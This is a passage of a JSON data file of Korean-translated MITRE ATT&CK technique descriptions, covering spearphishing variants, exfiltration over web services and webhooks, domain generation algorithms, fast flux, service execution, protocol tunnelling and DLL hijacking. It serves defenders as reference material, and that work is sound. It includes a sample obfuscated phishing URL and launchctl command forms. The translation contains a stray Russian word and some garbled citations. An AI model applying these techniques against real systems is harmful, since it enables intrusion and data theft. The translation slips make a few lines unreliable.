      "description": "상대방은 피해자의 시스템에 대한 접근을 얻기 위해 악성 링크가 포함된 스피어 피싱 이메일을 보낼 수 있습니다. 링크를 이용한 스피어 피싱은 스피어 피싱의 특정 변형으로, 이메일 첨부 파일에 악성 파일을 포함시키는 대신 이메일에 포함된 링크를 통해 악성 코드를 다운로드하는 방법을 사용하여 이메일 첨부 파일을 검사하는 방어 체계를 회피하는 점이 다릅니다. 스피어 피싱은 또한 신뢰할 수 있는 출처로 가장하는 것과 같은 사회 공학적 기법을 포함할 수 있습니다.\n\n모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 목표로 하는 전자적으로 전송되는 사회 공학입니다. 이 경우 악성 이메일은 링크를 포함하고 있습니다. 일반적으로 이 링크는 사회 공학적 텍스트와 함께 제공되며 사용자가 링크를 클릭하거나 URL을 브라우저에 복사하여 붙여넣도록 요구하여 [사용자 실행](https://attack.mitre.org/techniques/T1204)을 활용합니다. 방문하는 웹사이트는 취약점을 이용하여 웹 브라우저를 손상시킬 수 있으며, 사용자는 이메일의 전제가 무엇이든 간에 응용 프로그램, 문서, 압축 파일 또는 실행 파일을 다운로드하라는 메시지를 받을 수 있습니다.\n\n상대방은 이메일 독자를 직접 상호작용하도록 설계된 링크를 포함할 수도 있으며, 여기에는 최종 시스템을 직접 공격하기 위한 임베디드 이미지가 포함될 수 있습니다. 또한, 상대방은 특수 문자를 악용하여 합법적인 웹사이트를 모방하는 것처럼 보이는 링크를 사용할 수 있습니다(이를 \"IDN 동형 공격\"이라고 함). (인용: CISA IDN ST05-016) URL은 또한 URL 스키마의 특성을 이용하여 혼란스럽게 할 수 있으며, 예를 들어 정수 또는 16진수 기반 호스트 이름 형식의 수용 및 “@” 기호 이전의 텍스트 자동 폐기를 활용할 수 있습니다: 예를 들어, `hxxp://google.com@1157586937`. (인용: Mandiant URL Obfuscation 2023)\n\n상대방은 링크를 사용하여 동의 피싱을 수행할 수도 있으며, 일반적으로 OAuth 2.0 요청 URL을 사용하여 사용자가 수락할 경우 악성 응용 프로그램에 대한 권한/접속을 제공합니다. 이는 상대방이 [응용 프로그램 액세스 토큰을 훔치는](https://attack.mitre.org/techniques/T1528) 행위를 가능하게 합니다. (인용: Trend Micro Pawn Storm OAuth 2017) 이 도용된 액세스 토큰은 상대방이 API 호출을 통해 사용자를 대신해 다양한 작업을 수행할 수 있게 합니다. (인용: Microsoft OAuth 2.0 Consent Phishing 2021)\n\n상대방은 또한 스피어 피싱 링크를 활용하여 피해 환경에 즉각적인 접근을 제공하는 [응용 프로그램 액세스 토큰을 훔치](https://attack.mitre.org/techniques/T1528)도록 할 수 있습니다. 예를 들어, 사용자는 “동의 피싱”을 통해 악성 OAuth 2.0 요청 URL을 통해 상대방에게 권한/접속을 부여하도록 유도될 수 있습니다. (인용: Trend Micro Pawn Storm OAuth 2017)(인용: Microsoft OAuth 2.0 Consent Phishing 2021)\n\n유사하게, 악성 링크는 일반적으로 UI/브라우저 없이 장치를 인증하는 데 사용되는 OAuth 2.0 장치 인증 부여 흐름과 같은 장치 기반 권한 부여를 목표로 할 수 있습니다. 이를 “장치 코드 피싱”이라고 하며, 상대방은 피해자를 악성 권한 부여 페이지로 안내하는 링크를 보내 사용자가 장치 토큰을 생성하는 코드/자격 증명을 입력하도록 속일 수 있습니다. (인용: SecureWorks Device Code Phishing 2021)(인용: Netskope Device Code Phishing 2021)(인용: Optiv Device Code Phishing 2021)",
      "external_id": "T1566.002",
      "modified": "2024-10-15T16:06:32.591Z",
      "title": "Spearphishing Link",
      "translated": true
    },
    {
      "description": "공격자는 피해 시스템에 접근하기 위해 제3자 서비스를 통해 스피어 피싱 메시지를 보낼 수 있습니다. 서비스 기반 스피어 피싱은 스피어 피싱의 특정 변형입니다. 이는 기업 이메일 채널을 직접 사용하는 다른 형태의 스피어 피싱과 달리 제3자 서비스를 이용합니다.\n\n모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 목표로 하는 전자적으로 전달되는 사회 공학적 기법입니다. 이 시나리오에서 공격자는 다양한 소셜 미디어 서비스, 개인 웹메일 및 기타 비기업 통제 서비스에 메시지를 보냅니다. 이러한 서비스는 기업보다 더 느슨한 보안 정책을 가질 가능성이 높습니다. 대부분의 스피어 피싱 경우와 마찬가지로, 목표와의 교감을 만들거나 목표의 관심을 끌기 위한 것이 목적입니다. 공격자는 가짜 소셜 미디어 계정을 만들고 직원들에게 잠재적인 직업 기회에 대해 메시지를 보냅니다. 이렇게 하면 환경에서 실행 중인 서비스, 정책 및 소프트웨어에 대해 문의할 수 있는 그럴듯한 이유가 생깁니다. 이후 공격자는 이러한 서비스를 통해 악성 링크나 첨부파일을 보낼 수 있습니다.\n\n일반적인 예로는 소셜 미디어를 통해 목표와의 관계를 구축한 다음, 목표가 작업 컴퓨터에서 사용하는 개인 웹메일 서비스로 콘텐츠를 보내는 것입니다. 이로 인해 공격자는 작업 계정의 이메일 제한을 우회할 수 있으며, 목표는 자신이 기대했던 파일이기 때문에 파일을 열 가능성이 더 높습니다. 만약 페이로드가 예상대로 작동하지 않으면, 공격자는 정상적인 커뮤니케이션을 계속하고 목표와 함께 작동 방법에 대해 문제를 해결할 수 있습니다.",
      "external_id": "T1566.003",
      "modified": "2024-10-15T15:16:30.272Z",
      "title": "Spearphishing via Service",
      "translated": true
    },
    {
      "description": "적대세력은 피해 시스템에 접근하기 위해 음성 통신을 사용할 수 있습니다. 음성 스피어 피싱(Spearphishing voice)은 특정한 형태의 스피어 피싱으로, 사용자에게 전화를 걸거나 기타 음성 통신 방식을 통해 시스템 접근을 제공하도록 조작하는 방식에서 다른 스피어 피싱과 차별화됩니다. 스피어 피싱은 종종 신뢰할 수 있는 출처(예: [ impersonation](https://attack.mitre.org/techniques/T1656)으로 가장하기)로 변장하거나 수신자에게 긴박감이나 경고를 조성하는 등의 소셜 엔지니어링 기법을 포함합니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 소셜 엔지니어링입니다. 이 시나리오에서 적대 세력은 피해자에게 직접적으로 악성 코드(malware)를 보내는 것이 아니라, [사용자 실행](https://attack.mitre.org/techniques/T1204) 방법을 통해 악성 코드를 전달하고 실행하는 데 의존합니다. 예를 들어, 피해자는 악성 URL로 방문하라고 지시하는 전화번호로 전화를 걸도록 안내하는 피싱 메시지를 받을 수 있습니다. 이러한 메시지는 악성 코드를 다운로드하게 하거나 (인용: sygnia Luna Month)(인용: CISA 원격 모니터링 및 관리 소프트웨어) 적대자가 접근할 수 있는 원격 관리 도구([원격 액세스 소프트웨어](https://attack.mitre.org/techniques/T1219))를 자신의 컴퓨터에 설치하도록 유도할 수 있습니다. (인용: Unit42 Luna Moth)\n\n또한, 적대 세력은 음성 피싱을 [다중 인증 요청 생성](https://attack.mitre.org/techniques/T1621)과 결합하여 사용자가 MFA 자격 증명을 누설하거나 인증 프롬프트를 수락하도록 속일 수 있습니다. (인용: Proofpoint Vishing)",
      "external_id": "T1566.004",
      "modified": "2024-10-15T16:06:47.134Z",
      "title": "Spearphishing Voice",
      "translated": true
    },
    {
      "description": "위협 행위자들은 기존의 합법적인 외부 웹 서비스를 이용하여 데이터 유출을 수행할 수 있으며, 이는 그들의 기본 명령 및 제어 채널 대신 사용됩니다. 데이터 유출 메커니즘으로 작용하는 인기 있는 웹 서비스는 네트워크 내 호스트가 침해되기 전에 이미 이들과 통신하고 있을 가능성이 높기 때문에 상당한 은폐를 제공할 수 있습니다. 또한, 이러한 서비스로의 트래픽을 허용하는 방화벽 규칙이 이미 존재할 수 있습니다.\n\n웹 서비스 제공자들은 일반적으로 SSL/TLS 암호화를 사용하기 때문에 위협 행위자들에게 추가적인 보호 수준을 제공합니다.",
      "external_id": "T1567",
      "modified": "2024-10-15T15:57:40.951Z",
      "title": "Exfiltration Over Web Service",
      "translated": true
    },
    {
      "description": "적대자는 주 명령 및 제어 채널을 통해서가 아니라 코드 리포지토리로 데이터를 유출할 수 있습니다. 코드 리포지토리는 종종 API를 통해 접근할 수 있으며(예: https://api.github.com), 이들 API에 대한 접근은 종종 HTTPS를 통해 이루어지므로, 적대자에게 추가적인 보호 수준을 제공합니다.\n\n코드 리포지토리로의 유출은 네트워크 내의 호스트들이 이미 사용하는 인기 있는 서비스인 경우 적대자에게 상당한 양의 위장을 제공할 수 있습니다.",
      "external_id": "T1567.001",
      "modified": "2023-09-15T19:08:16.882Z",
      "title": "Exfiltration to Code Repository",
      "translated": true
    },
    {
      "description": "적대자들은 주요 명령 및 제어 채널을 통해서가 아니라 클라우드 저장 서비스로 데이터를 유출할 수 있습니다. 클라우드 저장 서비스는 원격 클라우드 저장 서버에서 인터넷을 통해 데이터를 저장, 편집 및 검색할 수 있도록 허용합니다.\n\n클라우드 저장 서비스의 예로는 Dropbox와 Google Docs가 있습니다. 이러한 클라우드 저장 서비스로의 데이터 유출은 네트워크 내 호스트가 이미 해당 서비스와 통신하고 있는 경우 적대자에게 상당한 은폐를 제공할 수 있습니다.",
      "external_id": "T1567.002",
      "modified": "2023-09-15T19:11:47.547Z",
      "title": "Exfiltration to Cloud Storage",
      "translated": true
    },
    {
      "description": "위협 행위자들은 주요 명령 및 제어 채널 대신 텍스트 저장소 사이트로 데이터를 유출할 수 있습니다. `<code>pastebin[.]com</code>`과 같은 텍스트 저장소 사이트는 개발자들이 코드 및 기타 정보를 공유하는 데 일반적으로 사용됩니다.\n\n텍스트 저장소 사이트는 C2 통신을 위한 악성 코드를 호스팅하는 데 자주 사용되지만 (예: [단계 기능](https://attack.mitre.org/techniques/T1608)), 위협 행위자들은 수집된 데이터를 유출하기 위해 이러한 사이트를 사용할 수도 있습니다. 또한 유료 기능 및 암호화 옵션은 위협 행위자가 데이터를 보다 안전하게 숨기고 저장할 수 있도록 할 수 있습니다. (출처: Pastebin EchoSec)\n\n**주:** 이는 API를 통해 코드 저장소에 대한 접근을 강조하는 [코드 저장소로의 유출](https://attack.mitre.org/techniques/T1567/001)과는 구별됩니다.",
      "external_id": "T1567.003",
      "modified": "2023-05-04T18:00:33.023Z",
      "title": "Exfiltration to Text Storage Sites",
      "translated": true
    },
    {
      "description": "상대방은 주요 명령 및 제어 채널을 통해 데이터 유출을 수행하는 대신, 웹훅 엔드포인트로 데이터를 전송할 수 있습니다. 웹훅은 클라이언트가 서버를 지속적으로 폴링할 필요 없이 서버가 HTTP/S를 통해 클라이언트로 데이터를 푸시할 수 있도록 허용하는 간단한 메커니즘입니다. 많은 공공 및 상업적 서비스, 예를 들어 Discord, Slack, 및 `webhook.site`는 다른 서비스, 즉 Github, Jira 또는 Trello가 사용할 수 있는 웹훅 엔드포인트를 생성하는 것을 지원합니다. 연결된 서비스에서 변경 사항이 발생하면(예: 저장소 업데이트를 푸시하거나 티켓을 수정), 이러한 서비스는 소비하는 애플리케이션에서 사용할 수 있도록 데이터를 웹훅 엔드포인트에 자동으로 게시합니다.\n\n상대방은 반복적인 [자동화된 데이터 유출](https://attack.mitre.org/techniques/T1020)을 달성하기 위해 공격자가 소유한 환경을 피해자가 소유한 SaaS 서비스와 연결할 수 있습니다. (출처: Push Security SaaS Attacks Repository Webhooks) 또는 웹훅 엔드포인트를 서비스와 연결하는 대신, 공격자는 스테이징된 데이터를 URL에 직접 수동으로 게시하여 유출할 수 있습니다. (출처: Microsoft SQL Server)\n\n웹훅 엔드포인트에 대한 접근은 종종 HTTPS를 통해 이루어지며, 이는 공격자에게 추가적인 보호 수준을 제공합니다. 웹훅을 활용한 데이터 유출은 웹훅 엔드포인트가 일반적으로 사용되는 SaaS 애플리케이션이나 협업 서비스로 향하는 경우에 정상적인 네트워크 트래픽과 혼합될 수 있습니다. (출처: CyberArk Labs Discord)(출처: Talos Discord Webhook Abuse)(출처: Checkmarx Webhooks)",
      "external_id": "T1567.004",
      "modified": "2024-10-15T15:57:55.928Z",
      "title": "Exfiltration Over Webhook",
      "translated": true
    },
    {
      "description": "공격자는 일반적인 탐지 및 대응을 피하기 위해 명령 및 제어 인프라와의 연결을 동적으로 설정할 수 있습니다. 이는 공격자가 맬웨어의 통신을 받기 위해 사용하는 인프라와 동일한 알고리즘을 공유하는 맬웨어를 사용함으로써 이루어질 수 있습니다. 이러한 계산은 명령 및 제어에 사용되는 도메인 이름, IP 주소 또는 포트 번호와 같은 매개변수를 동적으로 조정하는 데 사용될 수 있습니다.\n\n공격자는 [Fallback Channels](https://attack.mitre.org/techniques/T1008)의 목적으로 동적 해상도를 사용할 수 있습니다. 주요 명령 및 제어 서버와의 연결이 끊어졌을 때, 맬웨어는 명령 및 제어를 재수립하기 위한 수단으로 동적 해상도를 사용할 수 있습니다. (인용: Talos CCleanup 2017)(인용: FireEye POSHSPY 2017년 4월)(인용: ESET Sednit 2017 활동)",
      "external_id": "T1568",
      "modified": "2022-03-11T18:26:23.782Z",
      "title": "Dynamic Resolution",
      "translated": true
    },
    {
      "description": "공격자는 빠르게 변화하는 IP 주소 배열 뒤에 명령 및 제어 채널을 숨기기 위해 Fast Flux DNS를 사용할 수 있습니다. 이 기술은 단일 도메인 해상도에 연결된 여러 IP 주소가 높은 빈도로 교환되는 것을 포함하는 완전한 도메인 이름을 사용하며, 라운드 로빈 IP 주소 지정과 짧은 시간 생명 주기(TTL)를 결합하여 DNS 리소스 레코드에 적용됩니다.\n\n가장 간단한 \"단일 플럭스\" 방식은 단일 DNS 이름에 대한 DNS A(주소) 레코드 목록의 일환으로 주소를 등록하고 해제하는 것을 포함합니다. 이러한 등록은 평균 5분의 수명을 가지며, 그 결과 IP 주소 해상도가 지속적으로 혼잡하게 변합니다.\n\n이에 비해 \"이중 플럭스\" 방식은 DNS 영역의 DNS 네임 서버 레코드 목록의 일환으로 주소를 등록하고 해제하여 연결에 대한 추가적인 복원력을 제공합니다. 이중 플럭스를 사용하면 추가 호스트가 C2 호스트에 대한 프록시 역할을 수행할 수 있어 C2 채널의 실제 출처를 더 잘 숨길 수 있습니다.",
      "external_id": "T1568.001",
      "modified": "2020-03-27T16:10:37.183Z",
      "title": "Fast Flux DNS",
      "translated": true
    },
    {
      "description": "공격자는 고정된 IP 주소나 도메인 목록에 의존하기보다는 명령 및 제어 트래픽의 목적지 도메인을 동적으로 식별하기 위해 도메인 생성 알고리즘(DGA)을 사용할 수 있습니다. 이는 공격자가 악성 소프트웨어가 명령을 위한 지침을 확인할 수 있는 수천 개의 도메인이 존재할 수 있기 때문에 방어자가 명령 및 제어 채널을 차단하거나 추적하거나 차지하기가 훨씬 더 어려워진다는 장점이 있습니다. (인용: Cybereason DGA 분석)(인용: Cisco Umbrella DGA)(인용: Unit 42 DGA 2019년 2월)\n\nDGA는 도메인 이름을 생성할 때 각 문자를 생성하여 보이는 랜덤하거나 \"어리둥절한\" 문자열(예: istgmxdejdnxuyla.ru)의 형태를 취할 수 있습니다. 또는 일부 DGA는 단어를 연결하여 문자의 단위 대신 전체 단어를 사용하는 형태(예: cityjulydish.net)일 수 있습니다. 많은 DGA는 시간 기반으로, 각 시간대(시간마다, 매일, 매월 등)에 대해 다른 도메인을 생성합니다. 일부는 또한 예측하기 어렵게 만들기 위해 시드 값을 통합합니다. (인용: Cybereason DGA 분석)(인용: Cisco Umbrella DGA)(인용: Talos CCleanup 2017)(인용: Akamai DGA 완화)\n\n공격자는 [백업 채널](https://attack.mitre.org/techniques/T1008) 목적을 위해 DGA를 사용할 수 있습니다. 주 명령 및 제어 서버와의 연결이 끊어졌을 때, 악성 소프트웨어는 명령 및 제어를 재설정하는 수단으로 DGA를 사용할 수 있습니다. (인용: Talos CCleanup 2017)(인용: FireEye POSHSPY 2017년 4월)(인용: ESET Sednit 2017 활동)",
      "external_id": "T1568.002",
      "modified": "2024-10-15T15:55:16.111Z",
      "title": "Domain Generation Algorithms",
      "translated": true
    },
    {
      "description": "적대 세력은 DNS 결과에서 반환된 주소를 기반으로 계산을 수행하여 명령 및 제어를 위해 사용할 포트와 IP 주소를 결정할 수 있습니다. 이는 미리 결정된 포트 번호나 실제 반환된 IP 주소에 의존하지 않고 이루어질 수 있습니다. IP 및/또는 포트 번호 계산은 C2 채널에서 나가는 필터링을 우회하는 데 사용될 수 있습니다. (출처: Meyers Numbered Panda)\n\n[DNS 계산](https://attack.mitre.org/techniques/T1568/003)의 한 구현으로는 DNS 응답에서 IP 주소의 처음 세 옥텟을 가져와서 이러한 값을 사용하여 명령 및 제어 트래픽의 포트를 계산하는 방법이 있습니다. (출처: Meyers Numbered Panda)(출처: Moran 2014)(출처: Rapid7G20Espionage)",
      "external_id": "T1568.003",
      "modified": "2020-03-27T20:54:28.287Z",
      "title": "DNS Calculation",
      "translated": true
    },
    {
      "description": "적대자는 시스템 서비스나 데몬을 악용하여 명령이나 프로그램을 실행할 수 있습니다. 적대자는 로컬 또는 원격으로 서비스와 상호작용하거나 서비스를 생성하여 악성 콘텐츠를 실행할 수 있습니다. 많은 서비스가 부팅 시 자동으로 실행되도록 설정되어 있어 지속성을 확보하는 데 도움이 될 수 있습니다([시스템 프로세스 생성 또는 수정](https://attack.mitre.org/techniques/T1543)), 그러나 적대자는 또한 일회성 또는 임시 실행을 위해 서비스도 악용할 수 있습니다.",
      "external_id": "T1569",
      "modified": "2024-09-20T19:55:40.527Z",
      "title": "System Services",
      "translated": true
    },
    {
      "description": "공격자는 launchctl을 악용하여 명령 또는 프로그램을 실행할 수 있습니다. Launchctl은 macOS의 서비스 관리 프레임워크인 launchd와 인터페이스합니다. Launchctl은 명령줄에서, 대화식으로, 또는 표준 입력에서 리디렉션하여 하위 명령을 지원합니다.(출처: Launchctl Man)\n\n공격자는 launchctl을 사용하여 [Launch Agent](https://attack.mitre.org/techniques/T1543/001) 또는 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)으로 명령 및 프로그램을 실행합니다. 일반적인 하위 명령에는 <code>launchctl load</code>, <code>launchctl unload</code>, 및 <code>launchctl start</code>가 포함됩니다. 공격자는 스크립트를 사용하거나 수동으로 <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> 또는 <code>/bin/launchctl load</code> 명령을 실행하여 [Launch Agent](https://attack.mitre.org/techniques/T1543/001) 또는 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)을 실행할 수 있습니다.(출처: Sofacy Komplex Trojan)(출처: 20 macOS Common Tools and Techniques)",
      "external_id": "T1569.001",
      "modified": "2024-09-20T20:14:35.179Z",
      "title": "Launchctl",
      "translated": true
    },
    {
      "description": "적대자는 Windows 서비스 제어 관리자를 악용하여 악성 명령이나 페이로드를 실행할 수 있습니다. Windows 서비스 제어 관리자(<code>services.exe</code>)는 서비스를 관리하고 조작하기 위한 인터페이스입니다.(인용: Microsoft Service Control Manager) 서비스 제어 관리자는 GUI 구성 요소뿐만 아니라 <code>sc.exe</code> 및 [Net](https://attack.mitre.org/software/S0039)과 같은 시스템 유틸리티를 통해 사용자에게 접근할 수 있습니다.\n\n[PsExec](https://attack.mitre.org/software/S0029) 또한 서비스 제어 관리자 API를 통해 생성된 임시 Windows 서비스를 통해 명령이나 페이로드를 실행하는 데 사용될 수 있습니다.(인용: Russinovich Sysinternals) [PsExec](https://attack.mitre.org/software/S0029) 및 <code>sc.exe</code>와 같은 도구는 원격 서버를 인자로 받아들일 수 있으며 원격 실행을 수행하는 데 사용할 수 있습니다.\n\n적대자는 이러한 메커니즘을 활용하여 악성 콘텐츠를 실행할 수 있습니다. 이는 새롭거나 수정된 서비스를 실행함으로써 이루어질 수 있습니다. 이 기술은 서비스 지속성 또는 권한 상승과 관련하여 [Windows Service](https://attack.mitre.org/techniques/T1543/003)와 함께 사용되는 실행 방법입니다.",
      "external_id": "T1569.002",
      "modified": "2024-10-15T16:41:40.247Z",
      "title": "Service Execution",
      "translated": true
    },
    {
      "description": "위협 행위자는 손상된 환경 내에서 시스템 간에 도구나 기타 파일을 전송할 수 있습니다. 피해 환경으로 가져온 후(예: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), 작전 진행 중에 위협 행위자의 도구나 다른 파일을 한 시스템에서 다른 시스템으로 복사할 수 있습니다.\n\n또한, 위협 행위자는 내부 피해 시스템 간에 파일을 복사하여 [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)와 같은 기본 파일 공유 프로토콜을 사용하거나 [원격 데스크톱 프로토콜](https://attack.mitre.org/techniques/T1021/001)을 통해 인증된 연결로 연결된 네트워크 공유에서 수평 이동을 지원할 수 있습니다. (인용: Unit42 LockerGoga 2019)\n\n파일은 또한 피해 시스템에 존재하는 기본 도구를 사용하여 전송될 수 있습니다. 예를 들어, `scp`, `rsync`, `curl`, `sftp`, 및 [ftp](https://attack.mitre.org/software/S0095)와 같은 도구가 포함됩니다. 경우에 따라 위협 행위자는 [웹 서비스](https://attack.mitre.org/techniques/T1102)인 Dropbox 또는 OneDrive를 활용하여 자동으로 동기화된 공유 폴더를 통해 한 기계에서 다른 기계로 파일을 복사할 수 있습니다. (인용: Dropbox Malware Sync)",
      "external_id": "T1570",
      "modified": "2023-10-01T13:48:28.738Z",
      "title": "Lateral Tool Transfer",
      "translated": true
    },
    {
      "description": "적대자는 일반적으로 연관되지 않는 프로토콜 및 포트 조합을 사용하여 통신할 수 있습니다. 예를 들어, 전통적인 포트 443 대신에 포트 8088(출처: Symantec Elfin 2019년 3월) 또는 포트 587(출처: Fortinet Agent Tesla 2018년 4월)을 통한 HTTPS를 사용할 수 있습니다. 적대자는 필터링을 우회하거나 네트워크 데이터의 분석/파싱을 혼란스럽게 하기 위해 프로토콜에서 사용하는 표준 포트에 변경을 가할 수 있습니다.\n\n또한 적대자는 피해 시스템에 변경을 가하여 비표준 포트를 악용할 수 있습니다. 예를 들어, 레지스트리 키 및 기타 구성 설정을 사용하여 프로토콜 및 포트 조합을 수정할 수 있습니다. (출처: change_rdp_port_conti)",
      "external_id": "T1571",
      "modified": "2024-09-12T19:37:57.868Z",
      "title": "Non-Standard Port",
      "translated": true
    },
    {
      "description": "공격자는 피해 시스템과의 네트워크 통신을 다른 프로토콜 내에서 터널링하여 검출/네트워크 필터링을 피하거나, 그렇지 않으면 접근할 수 없는 시스템에 대한 접근을 가능하게 할 수 있습니다. 터널링은 명시적으로 하나의 프로토콜을 다른 프로토콜 내에 인캡슐레이션하는 것을 포함합니다. 이 행동은 기존의 트래픽에 섞여 악성 트래픽을 숨기거나 (VPN과 유사하게) 암호화의 외부 레이어를 제공할 수 있습니다. 터널링은 또한 SMB, RDP 또는 네트워크 장비에 의해 필터링되거나 인터넷을 통해 라우팅되지 않을 다른 트래픽과 같이, 의도된 목적지에 도달하지 못할 네트워크 패킷의 라우팅을 가능하게 할 수 있습니다.\n\n여러 가지 방법으로 하나의 프로토콜을 다른 프로토콜 내에 인캡슐레이션할 수 있습니다. 예를 들어, 공격자는 SSH 터널링(SSH 포트 포워딩이라고도 알려짐)을 수행할 수 있으며, 이는 암호화된 SSH 터널을 통해 임의 데이터를 전달하는 것을 포함합니다.(인용: SSH Tunneling)\n\n[프로토콜 터널링](https://attack.mitre.org/techniques/T1572)은 또한 공격자가 [동적 해상도](https://attack.mitre.org/techniques/T1568) 중에 악용할 수 있습니다. DNS over HTTPS (DoH)로 알려진 이 방법은 C2 인프라를 해결하기 위한 쿼리를 암호화된 HTTPS 패킷 내에 캡슐화할 수 있습니다.(인용: BleepingComp Godlua JUL19)\n\n공격자는 또한 [프록시](https://attack.mitre.org/techniques/T1090) 및/또는 [프로토콜 또는 서비스 사칭](https://attack.mitre.org/techniques/T1001/003)과 함께 [프로토콜 터널링](https://attack.mitre.org/techniques/T1572)을 활용하여 C2 통신 및 인프라를 더욱 숨길 수 있습니다.",
      "external_id": "T1572",
      "modified": "2020-03-27T17:15:35.372Z",
      "title": "Protocol Tunneling",
      "translated": true
    },
    {
      "description": "적대자는 통신 프로토콜이 제공하는 본래의 보호 기능에 의존하는 대신, C&C(명령 및 제어) 트래픽을 숨기기 위해 암호화 알고리즘을 사용할 수 있습니다. 안전한 알고리즘을 사용하더라도, 이러한 구현은 비밀 키가 악성 코드 샘플 또는 구성 파일 내에서 암호화되거나 생성될 경우 역공학에 취약할 수 있습니다.",
      "external_id": "T1573",
      "modified": "2024-04-16T12:29:47.903Z",
      "title": "Encrypted Channel",
      "translated": true
    },
    {
      "description": "적대자는 통신 프로토콜에서 제공하는 고유한 보호 기능에 의존하기보다는 명령 및 제어 트래픽을 숨기기 위해 알려진 대칭 암호화 알고리즘을 사용할 수 있습니다. 대칭 암호화 알고리즘은 평문 암호화와 암호문 복호화에 동일한 키를 사용합니다. 일반적인 대칭 암호화 알고리즘으로는 AES, DES, 3DES, Blowfish 및 RC4가 있습니다.",
      "external_id": "T1573.001",
      "modified": "2023-12-26T20:58:19.356Z",
      "title": "Symmetric Cryptography",
      "translated": true
    },
    {
      "description": "위협 행위자는 통신 프로토콜이 제공하는 본래의 보호 기능에 의존하기보다, 명확한 비대칭 암호화 알고리즘을 사용하여 명령 및 제어 트래픽을 은폐할 수 있습니다. 비대칭 암호화, 일반적으로 공개 키 암호화라고도 알려진 이 방법은 각 당사자마다 하나의 공개 키(자유롭게 배포 가능)와 하나의 개인 키(비공개)로 구성된 키 쌍을 사용합니다. 키 생성 방식 때문에 발신자는 수신자의 공개 키로 데이터를 암호화하고, 수신자는 자신의 개인 키로 데이터를 복호화합니다. 이는 오직 지정된 수신자만 암호화된 데이터를 읽을 수 있도록 보장합니다. 일반적인 공개 키 암호화 알고리즘으로는 RSA와 ElGamal이 있습니다.\n\n효율성을 위해 많은 프로토콜(SSL/TLS 포함)은 연결이 설정된 후 대칭 암호화를 사용하지만, 키를 설정하거나 전송하는 데는 비대칭 암호화를 사용합니다. 이러한 이유로 이들 프로토콜은 [비대칭 암호화](https://attack.mitre.org/techniques/T1573/002)로 분류됩니다.",
      "external_id": "T1573.002",
      "modified": "2023-12-26T20:59:21.941Z",
      "title": "Asymmetric Cryptography",
      "translated": true
    },
    {
      "description": "적대자는 운영 체제가 프로그램을 실행하는 방식을 가로채어 자신의 악성 페이로드를 실행할 수 있습니다. 실행 흐름을 가로채는 것은 지속성을 위한 것일 수 있으며, 이 가로챈 실행은 시간이 지나도 반복될 수 있습니다. 적대자는 이러한 메커니즘을 사용하여 권한을 상승시키거나 응용 프로그램 제어 또는 기타 실행 제한과 같은 방어 수단을 회피할 수도 있습니다.\n\n적대자가 실행 흐름을 가로채는 방법에는 여러 가지가 있으며, 운영 체제가 실행할 프로그램을 찾는 방식을 조작하는 것이 포함됩니다. 프로그램에서 사용될 라이브러리를 운영 체제가 찾는 방식도 가로챌 수 있습니다. 운영 체제가 프로그램/자원을 찾기 위해 검색하는 위치, 예를 들어 파일 디렉토리와 Windows의 경우 레지스트리와 같은 위치도 악성 페이로드를 포함하도록 오염될 수 있습니다.",
      "external_id": "T1574",
      "modified": "2023-11-21T20:02:33.404Z",
      "title": "Hijack Execution Flow",
      "translated": true
    },
    {
      "description": "공격자는 DLL을 로드하는 데 사용되는 검색 순서를 적절히 조작하여 자신만의 악성 페이로드를 실행할 수 있습니다. 윈도우 시스템은 프로그램에 로드해야 할 DLL을 찾기 위해 일반적인 방법을 사용합니다. (인용: Microsoft 동적 링크 라이브러리 검색 순서)(인용: FireEye Hijacking 2010년 7월) DLL 로드를 가로채는 것은 지속성을 확보하거나 권한을 상승시키고/또는 파일 실행에 대한 제한을 회피하기 위한 목적일 수 있습니다.\n\n공격자가 DLL 로드를 가로채는 방법은 여러 가지가 있습니다. 공격자는 프로그램에 의해 요청될 합법적인 라이브러리의 위치보다 먼저 검색되는 디렉토리에 트로이 목마 동적 링크 라이브러리 파일(DLL)을 배치할 수 있습니다. 그렇게 되면 윈도우는 피해자 프로그램에서 호출할 때 그들의 악성 라이브러리를 로드하게 됩니다. 공격자는 또한 모호하게 지정된 DLL과 동일한 이름을 가진 악성 DLL을 합법적인 DLL보다 먼저 검색되는 위치에 배치하여 DLL 미리 로딩, 즉 바이너리 심기 공격을 수행할 수 있습니다. (인용: OWASP 바이너리 심기) 이러한 위치는 종종 프로그램의 현재 작업 디렉토리입니다. (인용: FireEye fxsst 2011년 6월) 원격 DLL 미리 로딩 공격은 프로그램이 DLL을 로드하기 전에 현재 디렉토리를 웹 공유와 같은 원격 위치로 설정할 때 발생합니다. (인용: Microsoft 보안 권고 2269637)\n\n팬텀 DLL 가로채기는 공격자가 존재하지 않는 DLL 파일에 대한 참조를 목표로 하는 특정 유형의 DLL 검색 순서 가로채기입니다. (인용: Hexacorn DLL 가로채기)(인용: 공격자가 DLL을 가로챕니다) 그들은 결측 모듈의 위치에서 올바른 이름으로 자신의 악성 DLL을 배치함으로써 이를 로드할 수 있습니다.\n\n공격자는 DLL 리디렉션을 통해 검색 순서를 직접 수정할 수도 있습니다. 이를 활성화한 경우(레지스트리에서 설정하고 리디렉션 파일을 생성) 프로그램이 다른 DLL을 로드하도록 할 수 있습니다. (인용: Microsoft 동적 링크 라이브러리 리디렉션)(인용: Microsoft 매니페스트)(인용: FireEye DLL 검색 순서 가로채기)\n\n검색 순서에 취약한 프로그램이 더 높은 권한 수준으로 실행되도록 구성되어 있다면, 공격자가 제어하는 DLL도 높은 수준에서 실행됩니다. 이 경우, 이 기술은 пользователь에서 관리자로 또는 관리자에서 SYSTEM으로 권한 상승에 사용할 수 있습니다. 경로 가로채기에 피해를 입은 프로그램은 악성 DLL이 그들이 대체하려는 합법적인 DLL도 로드하도록 구성되어 있기 때문에 정상적으로 작동하는 것처럼 보일 수 있습니다.",
      "external_id": "T1574.001",
      "modified": "2024-09-30T17:32:59.948Z",
      "title": "DLL Search Order Hijacking",
      "translated": true
    },
    {
